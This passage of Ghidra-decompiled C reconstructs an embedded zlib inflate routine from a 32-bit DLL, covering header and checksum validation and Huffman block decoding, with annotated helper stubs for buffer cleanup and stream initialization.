              if (cVar4 == '\0') goto LAB_1000ab0d;
            }
            goto LAB_1000b8df;
          }
          if (puVar2[8] != 0) {
            *(undefined4 *)(puVar2[8] + 0x1c) = 0;
          }
LAB_1000ab0d:
          *puVar2 = 7;
          puVar2[0x10] = 0;
LAB_1000ab1c:
          if ((puVar2[4] & 0x1000) != 0) {
            if (uVar10 != 0) {
              uVar10 = 0;
              do {
                cVar4 = *(char *)(uVar10 + (int)local_c);
                uVar10 = uVar10 + 1;
                uVar6 = puVar2[8];
                if (((uVar6 != 0) && (*(int *)(uVar6 + 0x24) != 0)) &&
                   (puVar2[0x10] < *(uint *)(uVar6 + 0x28))) {
                  *(char *)(*(int *)(uVar6 + 0x24) + puVar2[0x10]) = cVar4;
                  puVar2[0x10] = puVar2[0x10] + 1;
                }
              } while ((cVar4 != '\0') && (uVar10 < local_8));
              if ((puVar2[4] & 0x200) != 0) {
                uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],local_c,uVar10);
                puVar2[6] = uVar6;
              }
              local_c = (uint *)((int)local_c + uVar10);
              uVar10 = local_8 - uVar10;
              local_8 = uVar10;
              if (cVar4 == '\0') goto LAB_1000abb3;
            }
            goto LAB_1000b8df;
          }
          if (puVar2[8] != 0) {
            *(undefined4 *)(puVar2[8] + 0x24) = 0;
          }
LAB_1000abb3:
          *puVar2 = 8;
          uVar6 = local_10;
          uVar13 = uVar14;
switchD_1000a64e_caseD_1000abbc:
          if ((puVar2[4] & 0x200) == 0) {
LAB_1000ac1e:
            if (puVar2[8] != 0) {
              *(uint *)(puVar2[8] + 0x2c) = (int)puVar2[4] >> 9 & 1;
              *(undefined4 *)(puVar2[8] + 0x30) = 1;
            }
            uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(0,(uint *)0x0,0);
            puVar2[6] = uVar6;
            param_1[0xc] = uVar6;
            *puVar2 = 0xb;
            uVar14 = uVar13;
            goto LAB_1000ac4f;
          }
          if (uVar13 < 0x10) {
            uVar14 = uVar13;
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              uVar13 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              uVar14 = uVar13;
              local_14 = uVar13;
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar13 < 0x10);
          }
          if (uVar6 == (ushort)puVar2[6]) {
            uVar13 = 0;
            local_10 = 0;
            local_14 = 0;
            goto LAB_1000ac1e;
          }
          param_1[6] = (int)"header crc mismatch";
          uVar9 = uVar6;
LAB_1000a729:
          *puVar2 = 0x1d;
          uVar6 = uVar9;
          uVar14 = uVar13;
          goto LAB_1000ac52;
        case (undefined *)0x1000a94a:
          goto switchD_1000a64e_caseD_1000a94a;
        case (undefined *)0x1000a9d4:
          goto switchD_1000a64e_caseD_1000a9d4;
        case (undefined *)0x1000aa74:
          goto LAB_1000aa76;
        case (undefined *)0x1000ab1a:
          goto LAB_1000ab1c;
        case (undefined *)0x1000abbc:
          goto switchD_1000a64e_caseD_1000abbc;
        case (undefined *)0x1000ac6c:
          if (uVar14 < 0x20) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0x20);
          }
          uVar6 = (uVar6 >> 8 & 0xff00) + ((uVar6 & 0xff00) + uVar6 * 0x10000) * 0x100 +
                  (uVar6 >> 0x18);
          puVar2[6] = uVar6;
          param_1[0xc] = uVar6;
          uVar6 = 0;
          *puVar2 = 10;
          local_10 = 0;
          uVar14 = 0;
          uVar10 = local_8;
          goto LAB_1000acdb;
        case (undefined *)0x1000acd9:
LAB_1000acdb:
          if (puVar2[3] == 0) {
            param_1[3] = (int)local_20;
            param_1[4] = local_1c;
            *param_1 = (int)local_c;
            param_1[1] = uVar10;
            puVar2[0xe] = uVar6;
            puVar2[0xf] = uVar14;
            return 2;
          }
          uVar6 = EmbeddedZlibHuffmanDecoder_1000BD21(0,(byte *)0x0,0);
          puVar2[6] = uVar6;
          param_1[0xc] = uVar6;
          *puVar2 = 0xb;
          uVar10 = local_8;
          uVar6 = local_10;
switchD_1000a64e_caseD_1000acfe:
          if ((param_2 == 5) || (param_2 == 6)) goto LAB_1000b8df;
switchD_1000a64e_caseD_1000ad12:
          if (puVar2[1] == 0) {
            if (uVar14 < 3) {
              do {
                if (uVar10 == 0) goto LAB_1000b8df;
                uVar10 = uVar10 - 1;
                bVar8 = (byte)uVar14;
                uVar14 = uVar14 + 8;
                uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                local_10 = uVar6;
                local_8 = uVar10;
              } while (uVar14 < 3);
            }
            uVar9 = uVar6 >> 1;
            puVar2[1] = uVar6 & 1;
            uVar6 = uVar9 & 3;
            if (uVar6 == 0) {
              *puVar2 = 0xd;
            }
            else if (uVar6 == 1) {
              InflateBufferHelper_1000A5A8((int)puVar2);
              *puVar2 = 0x13;
              uVar9 = extraout_EDX;
              if (param_2 == 6) {
                local_10 = extraout_EDX >> 2;
                uVar14 = uVar14 - 3;
                goto LAB_1000b8df;
              }
            }
            else if (uVar6 == 2) {
              *puVar2 = 0x10;
            }
            else if (uVar6 == 3) {
              param_1[6] = (int)"invalid block type";
              *puVar2 = 0x1d;
            }
            uVar6 = uVar9 >> 2;
            uVar14 = uVar14 - 3;
LAB_1000a77b:
            local_14 = uVar14;
            local_10 = uVar6;
          }
          else {
            *puVar2 = 0x1a;
            uVar6 = uVar6 >> (sbyte)(uVar14 & 7);
            uVar14 = uVar14 - (uVar14 & 7);
            local_14 = uVar14;
            local_10 = uVar6;
          }
          goto LAB_1000ac52;
        case (undefined *)0x1000acfe:
          goto switchD_1000a64e_caseD_1000acfe;
        case (undefined *)0x1000ad12:
          goto switchD_1000a64e_caseD_1000ad12;
        case (undefined *)0x1000adcb:
          local_14 = uVar14 - (uVar14 & 7);
          local_10 = uVar6 >> (sbyte)(uVar14 & 7);
          if (local_14 < 0x20) {
            do {
              uVar14 = local_14;
              if (local_8 == 0) goto LAB_1000b8e2;
              local_8 = local_8 - 1;
              bVar8 = (byte)local_14;
              local_14 = local_14 + 8;
              local_10 = local_10 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
            } while (local_14 < 0x20);
          }
          if ((local_10 & 0xffff) != ~local_10 >> 0x10) {
            param_1[6] = (int)"invalid stored block lengths";
            uVar9 = local_10;
            uVar13 = local_14;
            goto LAB_1000a729;
          }
          puVar2[0x10] = local_10 & 0xffff;
          uVar6 = 0;
          uVar14 = 0;
          local_10 = 0;
          local_14 = 0;
          *puVar2 = 0xe;
          uVar10 = local_8;
          if (param_2 != 6) goto switchD_1000a64e_caseD_1000ae50;
          goto LAB_1000b8e2;
        case (undefined *)0x1000ae50:
switchD_1000a64e_caseD_1000ae50:
          *puVar2 = 0xf;
        case (undefined *)0x1000ae56:
          uVar9 = puVar2[0x10];
          if (uVar9 != 0) {
            if (uVar10 < uVar9) {
              uVar9 = uVar10;
            }
            if (local_1c < uVar9) {
              uVar9 = local_1c;
            }
            if (uVar9 != 0) {
              memcpy(local_20,local_c,uVar9);
              local_c = (uint *)((int)local_c + uVar9);
              uVar10 = local_8 - uVar9;
              local_1c = local_1c - uVar9;
              local_20 = local_20 + uVar9;
              puVar2[0x10] = puVar2[0x10] - uVar9;
              uVar6 = local_10;
              local_8 = uVar10;
              goto LAB_1000ac55;
            }
            goto LAB_1000b8df;
          }
          *puVar2 = 0xb;
          goto LAB_1000ac55;
        case (undefined *)0x1000aead:
          if (uVar14 < 0xe) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0xe);
          }
          uVar14 = uVar14 - 0xe;
          puVar2[0x18] = (uVar6 & 0x1f) + 0x101;
          uVar9 = uVar6 >> 10;
          puVar2[0x19] = (uVar6 >> 5 & 0x1f) + 1;
          uVar6 = uVar6 >> 0xe;
          puVar2[0x17] = (uVar9 & 0xf) + 4;
          local_14 = uVar14;
          local_10 = uVar6;
          if ((puVar2[0x18] < 0x11f) && (puVar2[0x19] < 0x1f)) {
            puVar2[0x1a] = 0;
            *puVar2 = 0x11;
            goto switchD_1000a64e_caseD_1000af91;
          }
          param_1[6] = (int)"too many length or distance symbols";
          break;
        case (undefined *)0x1000af91:
switchD_1000a64e_caseD_1000af91:
          while (puVar2[0x1a] < puVar2[0x17]) {
            if (uVar14 < 3) {
              do {
                if (uVar10 == 0) goto LAB_1000b8df;
                uVar10 = uVar10 - 1;
                bVar8 = (byte)uVar14;
                uVar14 = uVar14 + 8;
                uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                local_10 = uVar6;
                local_8 = uVar10;
              } while (uVar14 < 3);
            }
            uVar11 = (ushort)uVar6;
            uVar6 = uVar6 >> 3;
            *(ushort *)
             ((int)puVar2 + (uint)*(ushort *)(&DAT_1000db50 + puVar2[0x1a] * 2) * 2 + 0x70) =
                 uVar11 & 7;
            puVar2[0x1a] = puVar2[0x1a] + 1;
            uVar14 = uVar14 - 3;
            uVar10 = local_8;
            local_14 = uVar14;
            local_10 = uVar6;
          }
          while (puVar2[0x1a] < 0x13) {
            *(undefined2 *)
             ((int)puVar2 + (uint)*(ushort *)(&DAT_1000db50 + puVar2[0x1a] * 2) * 2 + 0x70) = 0;
            puVar2[0x1a] = puVar2[0x1a] + 1;
          }
          puVar2[0x13] = (uint)(puVar2 + 0x14c);
          puVar2[0x1b] = (uint)(puVar2 + 0x14c);
          puVar2[0x15] = 7;
          local_24 = ZlibRuntimeTableHelperA_1000C244(0,(int)(puVar2 + 0x1c),0x13,(int *)(puVar2 + 0x1b),puVar2 + 0x15,
                                  (ushort *)(puVar2 + 0xbc));
          if (local_24 == 0) {
            puVar2[0x1a] = 0;
            *puVar2 = 0x12;
            goto switchD_1000a64e_caseD_1000b1bf;
          }
          param_1[6] = (int)"invalid code lengths set";
LAB_1000aff4:
          *puVar2 = 0x1d;
          goto LAB_1000ac4f;
        case (undefined *)0x1000b1bf:
switchD_1000a64e_caseD_1000b1bf:
          while (uVar6 = puVar2[0x1a], uVar6 < puVar2[0x19] + puVar2[0x18]) {
            for (; uVar9 = *(uint *)(puVar2[0x13] +
                                    ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & local_10) * 4),
                uVar14 < (uVar9 >> 8 & 0xff); uVar14 = uVar14 + 8) {
              if (local_8 == 0) goto LAB_1000b8e2;
              local_8 = local_8 - 1;
              local_10 = local_10 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
            }
            uVar11 = (ushort)(uVar9 >> 0x10);
            bVar8 = (byte)(uVar9 >> 8);
            if (uVar11 < 0x10) {
              uVar14 = uVar14 - (uVar9 >> 8 & 0xff);
              local_10 = local_10 >> (bVar8 & 0x1f);
              *(ushort *)((int)puVar2 + uVar6 * 2 + 0x70) = uVar11;
              puVar2[0x1a] = puVar2[0x1a] + 1;
              local_14 = uVar14;
            }
            else {
              if (uVar11 == 0x10) {
                for (; uVar14 < (uVar9 >> 8 & 0xff) + 2; uVar14 = uVar14 + 8) {
                  if (local_8 == 0) goto LAB_1000b8e2;
                  local_8 = local_8 - 1;
                  local_10 = local_10 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                }
                uVar13 = uVar14 - (uVar9 >> 8 & 0xff);
                uVar9 = local_10 >> (bVar8 & 0x1f);
                if (uVar6 == 0) {
                  param_1[6] = (int)"invalid bit length repeat";
                  local_14 = uVar13;
                  local_10 = uVar9;
                  goto LAB_1000a729;
                }
                uVar1 = *(undefined2 *)((int)puVar2 + uVar6 * 2 + 0x6e);
                local_10 = uVar9 >> 2;
                iVar5 = (uVar9 & 3) + 3;
                uVar14 = uVar13 - 2;
              }
              else {
                local_14 = uVar9 >> 8 & 0xff;
                if (uVar11 == 0x11) {
                  for (; uVar14 < local_14 + 3; uVar14 = uVar14 + 8) {
                    if (local_8 == 0) goto LAB_1000b8e2;
                    local_8 = local_8 - 1;
                    local_10 = local_10 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
                    local_c = (uint *)((int)local_c + 1);
                  }
                  uVar9 = local_10 >> (bVar8 & 0x1f);
                  local_10 = uVar9 >> 3;
                  iVar5 = (uVar9 & 7) + 3;
                  iVar12 = -3 - local_14;
                }
                else {
                  for (; uVar14 < local_14 + 7; uVar14 = uVar14 + 8) {
                    if (local_8 == 0) goto LAB_1000b8e2;
                    local_8 = local_8 - 1;
                    local_10 = local_10 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
                    local_c = (uint *)((int)local_c + 1);
                  }
                  uVar9 = local_10 >> (bVar8 & 0x1f);
                  local_10 = uVar9 >> 7;
                  iVar5 = (uVar9 & 0x7f) + 0xb;
                  iVar12 = -7 - local_14;
                }
                uVar1 = 0;
                uVar14 = uVar14 + iVar12;
              }
              local_14 = uVar14;
              if (puVar2[0x19] + puVar2[0x18] < iVar5 + uVar6) {
                param_1[6] = (int)"invalid bit length repeat";
                *puVar2 = 0x1d;
                break;
              }
              for (; iVar5 != 0; iVar5 = iVar5 + -1) {
                *(undefined2 *)((int)puVar2 + puVar2[0x1a] * 2 + 0x70) = uVar1;
                puVar2[0x1a] = puVar2[0x1a] + 1;
              }
            }
          }
          if (*puVar2 != 0x1d) {
            if ((short)puVar2[0x9c] == 0) {
              param_1[6] = (int)"invalid code -- missing end-of-block";
            }
            else {
              puVar2[0x13] = (uint)(puVar2 + 0x14c);
              puVar2[0x1b] = (uint)(puVar2 + 0x14c);
              puVar2[0x15] = 9;
              local_24 = ZlibRuntimeTableHelperA_1000C244(1,(int)(puVar2 + 0x1c),puVar2[0x18],(int *)(puVar2 + 0x1b),
                                      puVar2 + 0x15,(ushort *)(puVar2 + 0xbc));
              if (local_24 == 0) {
                puVar2[0x14] = puVar2[0x1b];
                puVar2[0x16] = 6;
                local_24 = ZlibRuntimeTableHelperA_1000C244(2,(int)puVar2 + (puVar2[0x18] + 0x38) * 2,puVar2[0x19],
                                        (int *)(puVar2 + 0x1b),puVar2 + 0x16,
                                        (ushort *)(puVar2 + 0xbc));
                if (local_24 == 0) {
                  *puVar2 = 0x13;
                  if (param_2 != 6) {
                    uVar10 = local_8;
                    uVar6 = local_10;
                    goto switchD_1000a64e_caseD_1000b2ac;
                  }
                  goto LAB_1000b8e2;
                }
                param_1[6] = (int)"invalid distances set";
              }
              else {
                param_1[6] = (int)"invalid literal/lengths set";
              }
            }
            goto LAB_1000aff4;
          }
LAB_1000ac4f:
          uVar6 = local_10;
LAB_1000ac52:
          uVar10 = local_8;
          goto LAB_1000ac55;
        case (undefined *)0x1000b2ac:
switchD_1000a64e_caseD_1000b2ac:
          *puVar2 = 0x14;
        case (undefined *)0x1000b2b2:
          if ((uVar10 < 6) || (local_1c < 0x102)) {
            puVar2[0x6f1] = 0;
            uVar9 = *(uint *)(puVar2[0x13] + ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & uVar6) * 4);
            while (uVar14 < (uVar9 >> 8 & 0xff)) {
              if (local_8 == 0) goto LAB_1000b8e2;
              local_8 = local_8 - 1;
              uVar6 = uVar6 + ((uint)(byte)*local_c << ((byte)uVar14 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              uVar9 = *(uint *)(puVar2[0x13] + ((1 << ((byte)puVar2[0x15] & 0x1f)) - 1U & uVar6) * 4
                               );
              uVar14 = uVar14 + 8;
              local_14 = uVar14;
              local_10 = uVar6;
            }
            cVar4 = (char)uVar9;
            uVar13 = uVar9;
            if ((cVar4 != '\0') && ((uVar9 & 0xf0) == 0)) {
              bVar8 = (byte)(uVar9 >> 8);
              uVar13 = *(uint *)(puVar2[0x13] +
                                ((((1 << (cVar4 + bVar8 & 0x1f)) - 1U & local_10) >> (bVar8 & 0x1f))
                                + (uVar9 >> 0x10)) * 4);
              uVar14 = local_14;
              if (local_14 < (uVar13 >> 8 & 0xff) + (uVar9 >> 8 & 0xff)) {
                do {
                  uVar14 = local_14;
                  if (local_8 == 0) goto LAB_1000b8df;
                  local_8 = local_8 - 1;
                  uVar14 = local_14 + 8;
                  local_10 = local_10 + ((uint)(byte)*local_c << ((byte)local_14 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                  uVar13 = *(uint *)(puVar2[0x13] +
                                    ((((1 << (cVar4 + bVar8 & 0x1f)) - 1U & local_10) >>
                                     (bVar8 & 0x1f)) + (uVar9 >> 0x10)) * 4);
                  local_14 = uVar14;
                } while (uVar14 < (uVar13 >> 8 & 0xff) + (uint)bVar8);
              }
              uVar6 = local_10 >> (bVar8 & 0x1f);
              uVar14 = uVar14 - bVar8;
              puVar2[0x6f1] = (uint)bVar8;
            }
            uVar9 = uVar13 >> 8 & 0xff;
            puVar2[0x6f1] = puVar2[0x6f1] + uVar9;
            uVar14 = uVar14 - uVar9;
            uVar6 = uVar6 >> ((byte)(uVar13 >> 8) & 0x1f);
            puVar2[0x10] = uVar13 >> 0x10;
            local_14 = uVar14;
            local_10 = uVar6;
            if ((char)uVar13 != '\0') {
              if ((uVar13 & 0x20) != 0) {
                puVar2[0x6f1] = 0xffffffff;
                *puVar2 = 0xb;
                goto LAB_1000ac52;
              }
              uVar10 = local_8;
              if ((uVar13 & 0x40) != 0) {
                param_1[6] = (int)"invalid literal/length code";
                break;
              }
              *puVar2 = 0x15;
              puVar2[0x12] = uVar13 & 0xf;
switchD_1000a64e_caseD_1000b4a9:
              uVar9 = puVar2[0x12];
              if (uVar9 != 0) {
                if (uVar14 < uVar9) {
                  do {
                    if (uVar10 == 0) goto LAB_1000b8df;
                    uVar10 = uVar10 - 1;
                    bVar8 = (byte)uVar14;
                    uVar14 = uVar14 + 8;
                    uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                    local_c = (uint *)((int)local_c + 1);
                    local_10 = uVar6;
                    local_8 = uVar10;
                  } while (uVar14 < uVar9);
                }
                uVar14 = uVar14 - uVar9;
                uVar10 = (1 << ((byte)uVar9 & 0x1f)) - 1U & uVar6;
                uVar6 = uVar6 >> ((byte)uVar9 & 0x1f);
                puVar2[0x10] = puVar2[0x10] + uVar10;
                puVar2[0x6f1] = puVar2[0x6f1] + uVar9;
                local_14 = uVar14;
                local_10 = uVar6;
              }
              puVar2[0x6f2] = puVar2[0x10];
              *puVar2 = 0x16;
switchD_1000a64e_caseD_1000b50c:
              uVar9 = *(uint *)(puVar2[0x14] + ((1 << ((byte)puVar2[0x16] & 0x1f)) - 1U & uVar6) * 4
                               );
              if (uVar14 < (uVar9 >> 8 & 0xff)) {
                uVar10 = uVar14;
                do {
                  uVar14 = uVar10;
                  if (local_8 == 0) goto LAB_1000b8df;
                  local_8 = local_8 - 1;
                  uVar14 = uVar10 + 8;
                  uVar6 = uVar6 + ((uint)(byte)*local_c << ((byte)uVar10 & 0x1f));
                  local_c = (uint *)((int)local_c + 1);
                  uVar9 = *(uint *)(puVar2[0x14] +
                                   ((1 << ((byte)puVar2[0x16] & 0x1f)) - 1U & uVar6) * 4);
                  uVar10 = uVar14;
                  local_14 = uVar14;
                  local_10 = uVar6;
                } while (uVar14 < (uVar9 >> 8 & 0xff));
              }
              uVar10 = uVar9;
              if ((uVar9 & 0xf0) == 0) {
                bVar8 = (byte)(uVar9 >> 8);
                uVar10 = *(uint *)(puVar2[0x14] +
                                  ((((1 << ((char)uVar9 + bVar8 & 0x1f)) - 1U & local_10) >>
                                   (bVar8 & 0x1f)) + (uVar9 >> 0x10)) * 4);
                uVar14 = local_14;
                if (local_14 < (uVar10 >> 8 & 0xff) + (uVar9 >> 8 & 0xff)) {
                  do {
                    uVar14 = local_14;
                    if (local_8 == 0) goto LAB_1000b8df;
                    local_8 = local_8 - 1;
                    uVar14 = local_14 + 8;
                    local_10 = local_10 + ((uint)(byte)*local_c << ((byte)local_14 & 0x1f));
                    local_c = (uint *)((int)local_c + 1);
                    uVar10 = *(uint *)(puVar2[0x14] +
                                      ((((1 << ((char)uVar9 + bVar8 & 0x1f)) - 1U & local_10) >>
                                       (bVar8 & 0x1f)) + (uVar9 >> 0x10)) * 4);
                    local_14 = uVar14;
                  } while (uVar14 < (uVar10 >> 8 & 0xff) + (uint)bVar8);
                }
                uVar14 = uVar14 - bVar8;
                uVar6 = local_10 >> (bVar8 & 0x1f);
                puVar2[0x6f1] = puVar2[0x6f1] + (uint)bVar8;
              }
              uVar9 = uVar10 >> 8 & 0xff;
              puVar2[0x6f1] = puVar2[0x6f1] + uVar9;
              uVar14 = uVar14 - uVar9;
              uVar6 = uVar6 >> ((byte)(uVar10 >> 8) & 0x1f);
              local_14 = uVar14;
              local_10 = uVar6;
              if ((uVar10 & 0x40) == 0) {
                *puVar2 = 0x17;
                puVar2[0x11] = uVar10 >> 0x10;
                puVar2[0x12] = uVar10 & 0xf;
switchD_1000a64e_caseD_1000b667:
                uVar9 = puVar2[0x12];
                if (uVar9 != 0) {
                  if (uVar14 < uVar9) {
                    do {
                      if (local_8 == 0) goto LAB_1000b8e2;
                      local_8 = local_8 - 1;
                      bVar8 = (byte)uVar14;
                      uVar14 = uVar14 + 8;
                      uVar9 = puVar2[0x12];
                      uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                      local_c = (uint *)((int)local_c + 1);
                      local_10 = uVar6;
                    } while (uVar14 < uVar9);
                  }
                  uVar14 = uVar14 - uVar9;
                  uVar10 = (1 << ((byte)uVar9 & 0x1f)) - 1U & uVar6;
                  uVar6 = uVar6 >> ((byte)uVar9 & 0x1f);
                  puVar2[0x11] = puVar2[0x11] + uVar10;
                  puVar2[0x6f1] = puVar2[0x6f1] + uVar9;
                  local_14 = uVar14;
                  local_10 = uVar6;
                }
                *puVar2 = 0x18;
switchD_1000a64e_caseD_1000b6c2:
                if (local_1c != 0) {
                  uVar9 = puVar2[0x11];
                  if (local_2c - local_1c < uVar9) {
                    uVar9 = uVar9 - (local_2c - local_1c);
                    if ((puVar2[0xb] < uVar9) && (puVar2[0x6f0] != 0)) {
                      param_1[6] = (int)"invalid distance too far back";
                      uVar9 = uVar6;
                      uVar13 = uVar14;
                      goto LAB_1000a729;
                    }
                    if (puVar2[0xc] < uVar9) {
                      uVar9 = uVar9 - puVar2[0xc];
                      local_38 = (puVar2[0xd] + puVar2[10]) - uVar9;
                    }
                    else {
                      local_38 = (puVar2[0xd] - uVar9) + puVar2[0xc];
                    }
                    uVar10 = puVar2[0x10];
                    if (uVar10 < uVar9) goto LAB_1000b723;
                  }
                  else {
                    local_38 = (int)local_20 - uVar9;
                    uVar10 = puVar2[0x10];
LAB_1000b723:
                    uVar9 = uVar10;
                  }
                  if (local_1c < uVar9) {
                    uVar9 = local_1c;
                  }
                  local_1c = local_1c - uVar9;
                  puVar2[0x10] = uVar10 - uVar9;
                  local_38 = local_38 - (int)local_20;
                  do {
                    *local_20 = local_20[local_38];
                    local_20 = local_20 + 1;
                    uVar9 = uVar9 - 1;
                  } while (uVar9 != 0);
                  if (puVar2[0x10] == 0) {
                    *puVar2 = 0x14;
                  }
                  goto LAB_1000ac52;
                }
                goto LAB_1000b8df;
              }
              param_1[6] = (int)"invalid distance code";
              uVar9 = uVar6;
              uVar13 = uVar14;
              goto LAB_1000a729;
            }
            *puVar2 = 0x19;
            goto LAB_1000ac52;
          }
          param_1[3] = (int)local_20;
          param_1[4] = local_1c;
          *param_1 = (int)local_c;
          param_1[1] = uVar10;
          puVar2[0xe] = uVar6;
          puVar2[0xf] = uVar14;
          ZlibRuntimeTableHelperB_1000C6D0(param_1,local_2c);
          local_20 = (undefined1 *)param_1[3];
          local_10 = puVar2[0xe];
          uVar14 = puVar2[0xf];
          local_1c = param_1[4];
          uVar10 = param_1[1];
          local_c = (uint *)*param_1;
          uVar6 = local_10;
          local_14 = uVar14;
          local_8 = uVar10;
          if (*puVar2 == 0xb) {
            puVar2[0x6f1] = 0xffffffff;
          }
          goto LAB_1000ac55;
        case (undefined *)0x1000b4a9:
          goto switchD_1000a64e_caseD_1000b4a9;
        case (undefined *)0x1000b50c:
          goto switchD_1000a64e_caseD_1000b50c;
        case (undefined *)0x1000b667:
          goto switchD_1000a64e_caseD_1000b667;
        case (undefined *)0x1000b6c2:
          goto switchD_1000a64e_caseD_1000b6c2;
        case (undefined *)0x1000b765:
          if (local_1c != 0) {
            local_1c = local_1c - 1;
            *local_20 = (char)puVar2[0x10];
            *puVar2 = 0x14;
            local_20 = local_20 + 1;
            goto LAB_1000ac55;
          }
          goto LAB_1000b8df;
        case (undefined *)0x1000b78b:
          if (puVar2[2] != 0) {
            if (uVar14 < 0x20) {
              do {
                if (uVar10 == 0) goto LAB_1000b8df;
                uVar10 = uVar10 - 1;
                bVar8 = (byte)uVar14;
                uVar14 = uVar14 + 8;
                uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
                local_c = (uint *)((int)local_c + 1);
                local_14 = uVar14;
                local_10 = uVar6;
                local_8 = uVar10;
              } while (uVar14 < 0x20);
            }
            local_2c = local_2c - local_1c;
            param_1[5] = param_1[5] + local_2c;
            puVar2[7] = puVar2[7] + local_2c;
            if (local_2c != 0) {
              if (puVar2[4] == 0) {
                uVar6 = EmbeddedZlibHuffmanDecoder_1000BD21(puVar2[6],local_20 + -local_2c,local_2c);
              }
              else {
                uVar6 = EmbeddedZlibHuffmanHelper_1000BF51(puVar2[6],(uint *)(local_20 + -local_2c),local_2c);
              }
              puVar2[6] = uVar6;
              param_1[0xc] = uVar6;
              uVar6 = local_10;
            }
            uVar9 = ((uVar6 & 0xff00) + uVar6 * 0x10000) * 0x100 + (uVar6 >> 8 & 0xff00) +
                    (uVar6 >> 0x18);
            if (puVar2[4] != 0) {
              uVar9 = uVar6;
            }
            uVar10 = local_8;
            local_2c = local_1c;
            if (uVar9 != puVar2[6]) {
              param_1[6] = (int)"incorrect data check";
              break;
            }
            uVar6 = 0;
            uVar14 = 0;
            local_10 = 0;
            local_14 = 0;
          }
          *puVar2 = 0x1b;
        case (undefined *)0x1000b858:
          if ((puVar2[2] == 0) || (puVar2[4] == 0)) {
LAB_1000b8ce:
            *puVar2 = 0x1c;
switchD_1000a64e_caseD_1000b8d4:
            local_24 = 1;
LAB_1000b8dc:
            goto LAB_1000b8df;
          }
          if (uVar14 < 0x20) {
            do {
              if (uVar10 == 0) goto LAB_1000b8df;
              uVar10 = uVar10 - 1;
              bVar8 = (byte)uVar14;
              uVar14 = uVar14 + 8;
              uVar6 = uVar6 + ((uint)(byte)*local_c << (bVar8 & 0x1f));
              local_c = (uint *)((int)local_c + 1);
              local_14 = uVar14;
              local_10 = uVar6;
              local_8 = uVar10;
            } while (uVar14 < 0x20);
          }
          if (uVar6 == puVar2[7]) {
            local_10 = 0;
            uVar14 = 0;
            goto LAB_1000b8ce;
          }
          param_1[6] = (int)"incorrect length check";
          uVar9 = uVar6;
          uVar13 = uVar14;
          goto LAB_1000a729;
        case (undefined *)0x1000b8d4:
          goto switchD_1000a64e_caseD_1000b8d4;
        case (undefined *)0x1000b8d9:
          local_24 = -3;
          goto LAB_1000b8dc;
        case (undefined *)0x1000b93d:
          goto LAB_1000ac63;
        }
        *puVar2 = 0x1d;
LAB_1000ac55:
        uVar9 = *puVar2;
      } while (uVar9 < 0x1f);
    }
  }
  return -2;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibBufferSupport_1000BA60
 * Ghidra symbol: FUN_1000ba60 | VA: 0x1000BA60 | original source line: 10826
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 EmbeddedZlibBufferSupport_1000BA60(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (((param_1 == 0) || (iVar1 = *(int *)(param_1 + 0x1c), iVar1 == 0)) ||
     (*(code **)(param_1 + 0x24) == (code *)0x0)) {
    uVar2 = 0xfffffffe;
  }
  else {
    if (*(int *)(iVar1 + 0x34) != 0) {
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(iVar1 + 0x34));
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    uVar2 = 0;
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibInitialize_1000BAA4
 * Ghidra symbol: FUN_1000baa4 | VA: 0x1000BAA4 | original source line: 10849
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibStreamProcessor_1000BB48, ZlibHelperUnknownA_1000C223, ZlibHelperUnknownB_1000C236
 */
int EmbeddedZlibInitialize_1000BAA4(int param_1,uint param_2,char *param_3,int param_4)

{
  int iVar1;
  int iVar2;
  
  if (((param_3 == (char *)0x0) || (*param_3 != '1')) || (param_4 != 0x38)) {
    iVar2 = -6;
  }
  else if (param_1 == 0) {
    iVar2 = -2;
  }
  else {
